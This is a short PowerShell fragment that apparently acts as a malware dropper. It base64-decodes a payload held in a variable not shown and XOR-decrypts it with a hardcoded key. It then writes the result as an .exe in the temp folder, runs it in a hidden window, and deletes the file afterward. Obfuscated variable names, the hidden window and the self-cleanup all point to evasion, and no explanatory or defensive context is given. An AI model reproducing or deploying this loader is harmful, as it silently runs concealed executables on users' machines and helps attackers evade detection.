$kajg=[Convert]::FromBase64String($mcfp -join '');
$spbd=[Text.Encoding]::UTF8.GetBytes('bd1c1ac6619ca3c0');
$_r=[byte[]]::new($kajg.Length);
for($_i=0;$_i -lt $kajg.Length;$_i++){$_r[$_i]=$kajg[$_i] -bxor (([int]$spbd[$_i%$spbd.Length]+($_i -band 0xff)) -band 0xff)};
$kajg=$_r;
$cjlk=[IO.Path]::GetTempFileName()+'.exe';
[IO.File]::WriteAllBytes($cjlk,$kajg);
$_pr=Start-Process -FilePath $cjlk -Wait -PassThru -WindowStyle Hidden;
Remove-Item $cjlk -Force -EA 0;
exit $_pr.ExitCode;
